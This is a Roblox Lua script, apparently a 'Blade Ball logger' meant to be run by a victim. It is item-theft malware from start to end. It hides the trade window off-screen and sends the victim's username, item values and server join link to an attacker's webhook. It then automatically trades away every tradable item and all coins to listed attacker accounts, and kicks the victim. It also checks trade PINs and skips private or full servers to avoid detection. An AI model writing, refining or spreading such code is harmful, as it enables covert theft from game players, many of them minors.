-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // SERVICES
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local categories = {"Sword", "Emote", "Explosion"}

-- // CONFIGURATION
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 50
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- // SECURITE SERVEUR & PIN
if next(users) == nil or webhook == "" then return end
if game.PlaceId ~= 13772394625 then return end
if #Players:GetPlayers() >= 16 then return end
if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then return end

local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer({["option"] = "PIN", ["value"] = "9079"})
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Désactive ton code PIN de trade.")
    return
end

-- // UI INVISIBLE (Mouvement hors écran au lieu de .Enabled = false)
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui:WaitForChild("Trade")
local mainTrade = tradeGui:WaitForChild("Main")
local notifications = PlayerGui:FindFirstChild("Notifications")

local function hideUI()
    mainTrade.Position = UDim2.new(5, 0, 5, 0) -- On le jette très loin
    if notifications then notifications.Enabled = false end
    tradeGui.Black.Visible = false
    tradeGui.MiscChat.Visible = false
end

-- // FORMATAGE RAP
local function formatNumber(n)
    if not n then return "0" end
    local s = {"", "k", "m", "b", "t"}
    local i = 1
    while n >= 1000 and i < #s do n = n / 1000 i = i + 1 end
    return i == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, s[i])
end

-- // SCAN ET DATA
local itemsToSend = {}
local totalRAP = 0
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

local function buildMap(cat)
    local m = {}
    local d = rapData[cat]
    if d then
        for k, r in pairs(d) do
            local s, dec = pcall(function() return HttpService:JSONDecode(k) end)
            if s and type(dec) == "table" then
                for _, p in ipairs(dec) do if p[1] == "Name" then m[p[2]] = r end end
            end
        end
    end
    return m
end

for _, cat in ipairs(categories) do
    local map = buildMap(cat)
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            local r = map[info.Name] or 0
            if r >= min_rap and not info.TradeLock then
                totalRAP = totalRAP + r
                table.insert(itemsToSend, {ItemID = id, RAP = r, itemType = cat, Name = info.Name})
            end
        end
    end
end

-- // ENVOI WEBHOOK (JSON)
local function sendWebhook(isJoin)
    local isGood = totalRAP >= 500
    local color = isGood and 65280 or 8323327
    
    local grouped = {}
    for _, item in ipairs(itemsToSend) do grouped[item.Name] = (grouped[item.Name] or 0) + 1 end
    local listText = ""
    for name, count in pairs(grouped) do listText = listText .. name .. " (x" .. count .. ")\n" end

    local data = {
        ["username"] = isJoin and (isGood and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT") or "⚪ Eblack - SERVER HIT",
        ["content"] = isJoin and (ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')" or nil,
        ["embeds"] = {{
            ["title"] = isJoin and (isGood and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯") or "⚪ Server Hit 🎉",
            ["color"] = color,
            ["fields"] = {
                {name = "Victim Username:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Total RAP:", value = "**" .. formatNumber(totalRAP) .. "**", inline = true},
                {name = "Item List:", value = listText ~= "" and listText or "None", inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
        }}
    }
    
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        pcall(function() 
            req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) 
        end)
    end
end

-- // LOGIQUE DE TRADE
local function startTrade(gUserName)
    sendWebhook(false) -- Envoie le Server Hit
    hideUI()

    while #itemsToSend > 0 do
        pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(gUserName)) end)
        
        local start = tick()
        repeat task.wait(0.5) until tradeGui.Enabled or tick() - start > 20
        
        if tradeGui.Enabled then
            hideUI()
            
            -- Ajout des items (Max 100 par trade)
            local currentBatch = 0
            for i = #itemsToSend, 1, -1 do
                if currentBatch < 100 then
                    local item = table.remove(itemsToSend, i)
                    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                    currentBatch = currentBatch + 1
                end
            end

            -- Ajout des Tokens (Coins)
            pcall(function()
                local rawText = tradeGui.Main.Currency.Coins.Amount.Text
                local tokens = tonumber(rawText:gsub("[^%d]", "")) or 0
                if tokens > 0 then
                    netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens)
                end
            end)

            task.wait(1)
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            task.wait(1)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            
            repeat task.wait(0.5) until not tradeGui.Enabled
        end
        task.wait(1)
    end
    plr:kick("Trade terminé.")
end

-- // LANCEMENT
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    sendWebhook(true) -- Scan initial

    local function check(p)
        if table.find(users, p.Name) then
            startTrade(p.Name)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do check(p) end
    Players.PlayerAdded:Connect(check)
end
